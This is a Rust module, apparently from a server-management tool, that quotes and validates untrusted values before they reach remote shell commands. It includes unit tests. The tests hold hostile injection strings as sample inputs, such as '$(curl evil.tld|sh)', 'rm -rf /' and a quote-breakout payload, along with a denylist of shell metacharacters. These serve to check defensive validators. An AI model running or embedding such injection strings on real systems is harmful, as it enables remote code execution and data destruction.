//! The one place that turns untrusted values into pieces of a remote shell
//! command. Every module that builds a command string for
//! `SshSession::execute_command` goes through here.
//!
//! **Why this module exists.** Before it, `shell_quote` was copy-pasted
//! byte-for-byte into six modules (`dedicated_user`, `files::sudo_user`,
//! `runtime::docker`, `services::application_service`,
//! `services::database_service`, `services::dns_service`) and a seventh
//! near-copy lived in `runtime::remote_process`. Alongside them sat three
//! *different* `reject_unsafe`/`reject_newlines` helpers, each blocking a
//! different character set. That meant every call site independently
//! decided what was dangerous, and the audit found four separate CRITICAL
//! findings that were all the same mistake made in slightly different
//! places - most severely `network::wireguard`, whose helper blocked
//! newlines but not `$(...)`, while the script it fed wrote peer data into
//! an *unquoted* heredoc.
//!
//! **Two different jobs, deliberately kept separate.**
//!
//! - [`quote`] is for a value that becomes one argument of a command the
//!   remote shell parses. POSIX single-quoting makes the shell treat every
//!   byte literally, so a quoted value can never break out of its own
//!   argument. This is the default and should be preferred everywhere.
//! - [`reject_shell_metacharacters`] is for a value that lands somewhere a
//!   shell may still expand it - the body of an unquoted heredoc, a config
//!   file being generated inline, anything where quoting isn't available.
//!   Quoting is always the better answer; this is the fallback for the
//!   places that genuinely can't use it, and it fails closed.
//!
//! The typed validators (`validate_*`) are a third, stricter layer: when a
//! value has a known shape (a hostname, a WireGuard key, an octal mode),
//! checking that shape rejects far more than any character denylist can,
//! and it produces a better error message than a shell failure would.

use crate::errors::{AppError, AppResult};

/// POSIX single-quote escaping - the canonical implementation for this
/// codebase. Wraps `value` in `'...'` and rewrites any embedded `'` as
/// `'\''` (close, escaped quote, reopen). The result is safe to splice into
/// a command string as exactly one argument: inside single quotes `sh`
/// performs no expansion of any kind, so `$`, backticks, `;`, newlines and
/// every other metacharacter are literal bytes.
///
/// A null byte cannot be carried through an argv entry at all, so callers
/// that accept free-form input should pair this with
/// [`reject_shell_metacharacters`] or a typed validator rather than relying
/// on quoting alone to sanitize.
pub fn quote(value: &str) -> String {
    let mut quoted = String::with_capacity(value.len() + 2);
    quoted.push('\'');
    for ch in value.chars() {
        if ch == '\'' {
            quoted.push_str("'\\''");
        } else {
            quoted.push(ch);
        }
    }
    quoted.push('\'');
    quoted
}

/// Every character that lets a value escape an *unquoted* shell context.
/// `$` and `` ` `` start expansions; `\` starts an escape that can smuggle
/// the others through; `\n`/`\r` end the current line (and can terminate a
/// heredoc body early); `\0` truncates the value at the syscall boundary.
const SHELL_METACHARACTERS: &[char] = &['$', '`', '\\', '\n', '\r', '\0'];

/// Rejects a value that would be dangerous somewhere the shell can still
/// expand it. Fails closed on the first offending character, naming both
/// the field and the character so the error is actionable rather than a
/// generic "invalid input".
///
/// Prefer [`quote`] wherever the value is a real command argument - this is
/// for heredoc bodies and generated config, where quoting isn't on offer.
pub fn reject_shell_metacharacters(value: &str, field: &str) -> AppResult<()> {
    if let Some(found) = value.chars().find(|ch| SHELL_METACHARACTERS.contains(ch)) {
        let rendered = match found {
            '\n' => "a newline".to_string(),
            '\r' => "a carriage return".to_string(),
            '\0' => "a null byte".to_string(),
            ch => format!("'{ch}'"),
        };
        return Err(AppError::InvalidInput(format!("{field} can't contain {rendered}")));
    }
    Ok(())
}

/// Rejects only line-structure characters. For a value that is already
/// [`quote`]d (so expansion is impossible) but still must not introduce a
/// new line into a multi-line script or a line-oriented config file.
pub fn reject_newlines(value: &str, field: &str) -> AppResult<()> {
    if value.contains(['\n', '\r', '\0']) {
        return Err(AppError::InvalidInput(format!("{field} can't contain a newline")));
    }
    Ok(())
}

/// A hostname (RFC 1123 labels) or a bare IPv4/IPv6 literal - the shape
/// `Server::host` is allowed to take. Deliberately strict: this value ends
/// up in WireGuard endpoints, SSH targets and generated config, so anything
/// that isn't recognisably an address is rejected here rather than failing
/// later as a confusing remote error.
pub fn validate_host(value: &str, field: &str) -> AppResult<()> {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return Err(AppError::InvalidInput(format!("{field} is required")));
    }
    if trimmed.len() > 253 {
        return Err(AppError::InvalidInput(format!("{field} is too long")));
    }
    // An IPv6 literal is the one legitimate shape with ':' in it.
    if trimmed.parse::<std::net::Ipv6Addr>().is_ok() {
        return Ok(());
    }
    let labels_ok = trimmed.split('.').all(|label| {
        !label.is_empty()
            && label.len() <= 63
            && !label.starts_with('-')
            && !label.ends_with('-')
            && label.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
    });
    if !labels_ok {
        return Err(AppError::InvalidInput(format!(
            "{field} must be a hostname or IP address - '{trimmed}' isn't one"
        )));
    }
    Ok(())
}

/// A WireGuard public or preshared key: exactly 44 base64 characters ending
/// in `=` (32 raw bytes). Validating the shape is what stops a compromised
/// Node from returning `abc$(id)` where `wg pubkey` output was expected and
/// having that land in every other Node's generated config.
pub fn validate_wireguard_key(value: &str, field: &str) -> AppResult<()> {
    let trimmed = value.trim();
    let shape_ok = trimmed.len() == 44
        && trimmed.ends_with('=')
        && trimmed[..43].chars().all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/')
        && trimmed[..43].chars().filter(|&c| c == '=').count() == 0;
    if !shape_ok {
        return Err(AppError::InvalidInput(format!("{field} isn't a valid WireGuard key")));
    }
    Ok(())
}

/// A bare IPv4 address - the shape a mesh member's own address and a peer's
/// `AllowedIPs` base take.
pub fn validate_ipv4(value: &str, field: &str) -> AppResult<()> {
    if value.trim().parse::<std::net::Ipv4Addr>().is_err() {
        return Err(AppError::InvalidInput(format!("{field} isn't a valid IPv4 address")));
    }
    Ok(())
}

/// An IPv4 CIDR (`10.77.0.0/16`, `10.77.0.3/32`).
pub fn validate_ipv4_cidr(value: &str, field: &str) -> AppResult<()> {
    let trimmed = value.trim();
    let Some((address, prefix)) = trimmed.split_once('/') else {
        return Err(AppError::InvalidInput(format!("{field} must be in CIDR form, e.g. 10.77.0.0/16")));
    };
    validate_ipv4(address, field)?;
    match prefix.parse::<u8>() {
        Ok(bits) if bits <= 32 => Ok(()),
        _ => Err(AppError::InvalidInput(format!("{field} has an invalid CIDR prefix length"))),
    }
}

/// A firewall rule's source - one IPv4 address or an IPv4 network - in the
/// one spelling `ufw show added` prints back.
///
/// The spelling matters as much as the validity. A reconcile revokes every
/// VibeSSH rule the Node reports that is not in the desired set, so a rule
/// stored as `203.0.113.7/32` but reported as `203.0.113.7` is added and then
/// revoked by the same sync, every sync. A host address therefore loses its
/// `/32`, and a network with host bits set (`10.0.0.5/24`) is refused rather
/// than silently widened into a different rule than the one typed.
pub fn canonical_ipv4_source(value: &str, field: &str) -> AppResult<String> {
    let trimmed = value.trim();
    let Some((address, prefix)) = trimmed.split_once('/') else {
        validate_ipv4(trimmed, field)?;
        return Ok(trimmed.to_string());
    };
    validate_ipv4_cidr(trimmed, field)?;
    let bits: u32 = prefix.parse().map_err(|_| AppError::InvalidInput(format!("{field} has an invalid CIDR prefix length")))?;
    let address: std::net::Ipv4Addr = address.parse().map_err(|_| AppError::InvalidInput(format!("{field} isn't a valid IPv4 address")))?;
    if bits == 32 {
        return Ok(address.to_string());
    }
    let mask = if bits == 0 { 0 } else { u32::MAX << (32 - bits) };
    if u32::from(address) & !mask != 0 {
        let network = std::net::Ipv4Addr::from(u32::from(address) & mask);
        return Err(AppError::InvalidInput(format!("{field} has host bits set - did you mean {network}/{bits}?")));
    }
    Ok(format!("{address}/{bits}"))
}

/// An absolute POSIX path with no traversal component and no NUL - the
/// shape every `working_directory`, mount source and helper target must
/// take before it reaches a `chown -R`, a bind mount, or a `rm -rf`.
///
/// Note this deliberately does *not* accept a relative path: every caller
/// that uses it is naming a real location on a remote host, where "relative
/// to what" has no stable answer (the SSH session's cwd is whatever the
/// account's home happens to be).
pub fn validate_absolute_path(value: &str, field: &str) -> AppResult<()> {
    let trimmed = value.trim();
    if !trimmed.starts_with('/') {
        return Err(AppError::InvalidInput(format!("{field} must be an absolute path starting with '/'")));
    }
    if trimmed.contains('\0') {
        return Err(AppError::InvalidInput(format!("{field} can't contain a null byte")));
    }
    if trimmed.split('/').any(|segment| segment == "..") {
        return Err(AppError::InvalidInput(format!("{field} can't contain '..'")));
    }
    Ok(())
}

/// System paths an Application's `working_directory` must never be, because
/// provisioning recursively chowns that directory to the Application's own
/// unprivileged account. Chowning any of these would break the host - `/`
/// catastrophically so.
///
/// This is a denylist of exact paths plus a prefix check, not an allowlist,
/// on purpose: operators legitimately keep application data in `/srv`,
/// `/opt`, `/home/<user>`, `/data`, or a mounted volume with a site-specific
/// name, and an allowlist would reject reasonable choices while a
/// well-chosen denylist catches the accidents that actually happen (an
/// empty field defaulting to `/`, a stray `/etc`, a typo'd `/var`).
const FORBIDDEN_DIRECTORIES: &[&str] = &[
    "/", "/bin", "/boot", "/dev", "/etc", "/home", "/lib", "/lib32", "/lib64", "/media", "/mnt", "/opt", "/proc", "/root",
    "/run", "/sbin", "/srv", "/sys", "/tmp", "/usr", "/var",
];

/// Everything [`validate_absolute_path`] requires, plus: not a system
/// directory, and at least two path segments deep. The depth rule is what
/// makes the denylist hold up - `/srv` is refused by name, and `/srv/x` is
/// accepted, so a new top-level directory nobody listed (say `/data`) still
/// can't be used bare.
pub fn validate_application_directory(value: &str) -> AppResult<()> {
    let field = "the working directory";
    validate_absolute_path(value, field)?;
    let normalized = {
        let trimmed = value.trim().trim_end_matches('/');
        if trimmed.is_empty() { "/".to_string() } else { trimmed.to_string() }
    };
    let depth = normalized.split('/').filter(|segment| !segment.is_empty()).count();
    if FORBIDDEN_DIRECTORIES.contains(&normalized.as_str()) || depth < 2 {
        // One message for both cases: from the operator's point of view
        // "/etc" and "/data" fail for the same reason - they named a
        // directory the whole system shares instead of one this
        // Application owns - and the suggested fix is identical.
        let suggestion = if depth == 0 { "/srv/my-app".to_string() } else { format!("{normalized}/my-app") };
        return Err(AppError::InvalidInput(format!(
            "'{normalized}' is a shared system directory - this application needs its own directory, e.g. '{suggestion}'"
        )));
    }
    Ok(())
}

/// An octal permission mode as `chmod` expects it (`644`, `0755`) - digits
/// 0-7 only, at most 4 of them.
pub fn validate_octal_mode(value: &str, field: &str) -> AppResult<()> {
    let trimmed = value.trim();
    if trimmed.is_empty() || trimmed.len() > 4 || !trimmed.bytes().all(|b| (b'0'..=b'7').contains(&b)) {
        return Err(AppError::InvalidInput(format!("{field} isn't a valid octal permission mode")));
    }
    Ok(())
}

/// A Linux account name as `useradd`/`sudo -u` accept it: starts with a
/// lowercase letter or underscore, then lowercase alphanumerics, `_` or
/// `-`, at most 32 characters.
pub fn validate_linux_username(value: &str, field: &str) -> AppResult<()> {
    let mut chars = value.chars();
    let first_ok = matches!(chars.next(), Some(c) if c.is_ascii_lowercase() || c == '_');
    let rest_ok = chars.all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '_' || c == '-');
    if !first_ok || !rest_ok || value.len() > 32 {
        return Err(AppError::InvalidInput(format!("{field} isn't a valid Linux account name")));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn quote_wraps_a_plain_value() {
        assert_eq!(quote("/srv/app"), "'/srv/app'");
    }

    #[test]
    fn quote_neutralizes_every_metacharacter_by_making_it_literal() {
        // Inside single quotes sh expands nothing, so each of these stays
        // one argument rather than becoming a command.
        for hostile in ["a; rm -rf /", "a$(id)", "a`id`", "a && reboot", "a\nb", "a|b", "a>b", "a$HOME"] {
            let quoted = quote(hostile);
            assert!(quoted.starts_with('\'') && quoted.ends_with('\''), "{quoted}");
            assert_eq!(&quoted[1..quoted.len() - 1], hostile);
        }
    }

    #[test]
    fn quote_closes_and_reopens_around_an_embedded_single_quote() {
        assert_eq!(quote("it's"), r#"'it'\''s'"#);
        // The classic breakout attempt: a quote followed by a command.
        assert_eq!(quote("x'; rm -rf /; '"), r#"'x'\''; rm -rf /; '\'''"#);
    }

    #[test]
    fn reject_shell_metacharacters_blocks_every_expansion_opener() {
        for hostile in ["$(id)", "`id`", "a$HOME", "a\\nb", "a\nb", "a\rb", "a\0b", "${PATH}"] {
            assert!(reject_shell_metacharacters(hostile, "the value").is_err(), "should have rejected {hostile:?}");
        }
    }

    #[test]
    fn reject_shell_metacharacters_accepts_ordinary_config_values() {
        for good in ["10.77.0.1", "example.com:54221", "abc123+/=", "my-app"] {
            assert!(reject_shell_metacharacters(good, "the value").is_ok(), "should have accepted {good:?}");
        }
    }

    #[test]
    fn reject_shell_metacharacters_names_the_offending_character() {
        let err = reject_shell_metacharacters("a$b", "the endpoint").unwrap_err();
        assert!(err.to_string().contains("the endpoint"), "{err}");
        assert!(err.to_string().contains('$'), "{err}");
    }

    #[test]
    fn reject_newlines_allows_expansion_characters_but_not_line_breaks() {
        assert!(reject_newlines("a$b", "the value").is_ok());
        assert!(reject_newlines("a\nb", "the value").is_err());
        assert!(reject_newlines("a\rb", "the value").is_err());
    }

    #[test]
    fn validate_host_accepts_hostnames_and_ip_literals() {
        for good in ["example.com", "node-1.internal", "94.130.201.103", "::1", "2001:db8::1", "localhost"] {
            assert!(validate_host(good, "the host").is_ok(), "should have accepted {good:?}");
        }
    }

    #[test]
    fn validate_host_rejects_command_substitution_and_malformed_names() {
        for bad in ["$(curl evil.tld|sh)", "`id`", "a b", "-leading-dash.com", "trailing-.com", "", "a..b"] {
            assert!(validate_host(bad, "the host").is_err(), "should have rejected {bad:?}");
        }
    }

    #[test]
    fn validate_wireguard_key_accepts_a_real_key_shape() {
        assert!(validate_wireguard_key("K4hV1cB0mQ2sT7nZ9xY3lJ6pR8dW5gA0fE1uI2oC3vM=", "the key").is_ok());
    }

    #[test]
    fn validate_wireguard_key_rejects_anything_a_compromised_node_could_return() {
        for bad in [
            "abc$(id>/tmp/p)",
            "",
            "tooshort=",
            "K4hV1cB0mQ2sT7nZ9xY3lJ6pR8dW5gA0fE1uI2oC3vM",  // no trailing '='
            "K4hV1cB0mQ2sT7nZ9xY3lJ6pR8dW5gA0fE1uI2oC3v==", // '=' in the middle
            "K4hV1cB0mQ2sT7nZ9xY3lJ6pR8dW5gA0fE1uI2oC3v!=",
        ] {
            assert!(validate_wireguard_key(bad, "the key").is_err(), "should have rejected {bad:?}");
        }
    }

    #[test]
    fn validate_ipv4_and_cidr_accept_mesh_shapes_and_reject_injection() {
        assert!(validate_ipv4("10.77.0.3", "the IP").is_ok());
        assert!(validate_ipv4("10.77.0.3$(id)", "the IP").is_err());
        assert!(validate_ipv4_cidr("10.77.0.0/16", "the CIDR").is_ok());
        assert!(validate_ipv4_cidr("10.77.0.3/32", "the CIDR").is_ok());
        assert!(validate_ipv4_cidr("10.77.0.0", "the CIDR").is_err());
        assert!(validate_ipv4_cidr("10.77.0.0/33", "the CIDR").is_err());
    }

    /// The spelling is checked, not only the validity: a rule stored in any
    /// other spelling than the one `ufw show added` prints is revoked by the
    /// same sync that adds it.
    #[test]
    fn canonical_ipv4_source_spells_a_source_the_way_ufw_reports_it() {
        assert_eq!(canonical_ipv4_source(" 203.0.113.7 ", "the source").unwrap(), "203.0.113.7");
        assert_eq!(canonical_ipv4_source("203.0.113.7/32", "the source").unwrap(), "203.0.113.7");
        assert_eq!(canonical_ipv4_source("10.0.0.0/24", "the source").unwrap(), "10.0.0.0/24");
        assert_eq!(canonical_ipv4_source("0.0.0.0/0", "the source").unwrap(), "0.0.0.0/0");

        let widened = canonical_ipv4_source("10.0.0.5/24", "the source").unwrap_err().to_string();
        assert!(widened.contains("10.0.0.0/24"), "{widened}");

        for hostile in ["10.0.0.0/8; reboot", "$(id)", "10.0.0.0/8 to any port 22", "10.0.0.0/33", "10.0.0", ""] {
            assert!(canonical_ipv4_source(hostile, "the source").is_err(), "{hostile:?} must be refused");
        }
    }

    #[test]
    fn validate_absolute_path_rejects_relative_traversal_and_null_bytes() {
        assert!(validate_absolute_path("/srv/app", "the path").is_ok());
        assert!(validate_absolute_path("srv/app", "the path").is_err());
        assert!(validate_absolute_path("/srv/../etc", "the path").is_err());
        assert!(validate_absolute_path("/srv/a\0b", "the path").is_err());
    }

    #[test]
    fn validate_application_directory_accepts_a_real_dedicated_directory() {
        for good in ["/srv/my-app", "/opt/vibessh/paper", "/home/minecraft/survival", "/data/apps/bot", "/srv/my-app/"] {
            assert!(validate_application_directory(good).is_ok(), "should have accepted {good:?}");
        }
    }

    #[test]
    fn validate_application_directory_refuses_every_system_directory() {
        // These are the values that, before this check existed, would have
        // been handed to `sudo chown -R <app-user> <dir>` on every start.
        for bad in ["/", "//", "/etc", "/etc/", "/home", "/var", "/usr", "/root", "/tmp", "/srv", "/opt", "/boot", "/dev"] {
            assert!(validate_application_directory(bad).is_err(), "should have rejected {bad:?}");
        }
    }

    #[test]
    fn validate_application_directory_refuses_a_bare_top_level_directory() {
        // Not on the denylist, but still only one segment deep.
        assert!(validate_application_directory("/data").is_err());
        assert!(validate_application_directory("/mydata/app").is_ok());
    }

    #[test]
    fn validate_application_directory_refuses_traversal_and_relative_paths() {
        assert!(validate_application_directory("/srv/app/../../etc").is_err());
        assert!(validate_application_directory("srv/app").is_err());
        assert!(validate_application_directory("").is_err());
    }

    #[test]
    fn validate_octal_mode_accepts_chmod_shapes_only() {
        for good in ["644", "0755", "600", "7777"] {
            assert!(validate_octal_mode(good, "the mode").is_ok(), "should have accepted {good:?}");
        }
        for bad in ["", "888", "64a", "0o644", "-rw-r--r--", "07555"] {
            assert!(validate_octal_mode(bad, "the mode").is_err(), "should have rejected {bad:?}");
        }
    }

    #[test]
    fn validate_linux_username_matches_what_useradd_accepts() {
        for good in ["vibessh-app-abc123", "_svc", "mc"] {
            assert!(validate_linux_username(good, "the account").is_ok(), "should have accepted {good:?}");
        }
        for bad in ["1abc", "Abc", "a b", "a;id", "", &"a".repeat(33)] {
            assert!(validate_linux_username(bad, "the account").is_err(), "should have rejected {bad:?}");
        }
    }
}
